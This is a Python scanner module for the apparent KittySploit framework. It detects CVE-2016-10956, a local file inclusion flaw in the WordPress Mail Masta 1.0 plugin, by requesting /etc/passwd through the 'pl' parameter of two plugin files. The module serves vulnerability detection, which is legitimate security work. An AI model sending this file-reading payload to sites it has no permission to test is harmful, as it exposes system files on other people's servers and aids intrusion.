#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Mail Masta 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Mail Masta 1.0 - Local File Inclusion Detection',
        'description': 'WordPress Mail Masta 1.0 is susceptible to local file inclusion in count_of_send.php and csvexport.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2016', 'wordpress', 'wp-plugin', 'lfi', 'mail', 'mail-masta_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2016080220',
            'https://wpvulndb.com/vulnerabilities/8609',
            'https://wordpress.org/plugins/mail-masta/#developers',
            'https://nvd.nist.gov/vuln/detail/CVE-2016-10956',
            'https://github.com/p0dalirius/CVE-2016-10956-mail-masta',
        ],
        'cve': 'CVE-2016-10956',
    }

    def run(self):
        for path in ('/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd', '/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code not in (200, 500):
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="WordPress Mail Masta 1.0 - Local File Inclusion detected",
                    path=path,
                )
                return True
        return False

